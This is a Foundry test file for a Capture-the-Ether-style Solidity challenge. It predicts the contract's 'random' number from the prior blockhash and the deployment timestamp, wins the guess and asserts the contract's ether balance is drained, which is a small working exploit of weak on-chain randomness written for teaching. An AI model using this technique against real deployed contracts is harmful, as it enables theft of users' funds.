
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {GuessTheRandomNumberChallenge} from "../src/GuessTheRandomNumberChallenge.sol";

contract TestWeakRandomnessGuessTheRandomNumberChallenge is Test {

    GuessTheRandomNumberChallenge public _contractUnderTest;
    
    uint256 deploymentBlockNumber;
    uint256 deploymentTimestamp;

    function setUp() public {
        vm.deal(address(this), 10 ether);
        
        deploymentBlockNumber = block.number;
        deploymentTimestamp = block.timestamp;
        
        _contractUnderTest = new GuessTheRandomNumberChallenge{value: 1 ether}();
    }

    function test_highlightPredictableRandomValue() public {
        
        uint8 predictedAnswer = uint8(uint256(keccak256(abi.encodePacked(
            blockhash(deploymentBlockNumber - 1), 
            deploymentTimestamp
        ))));
        
        vm.deal(address(this), 1 ether);
        
        _contractUnderTest.guess{value: 1 ether}(predictedAnswer);
        
        assertTrue(_contractUnderTest.isComplete(), "Challenge should be complete - randomness was predictable");
        assertEq(address(_contractUnderTest).balance, 0, "Contract balance should be 0 after successful guess");
    }

    receive() external payable {}
}
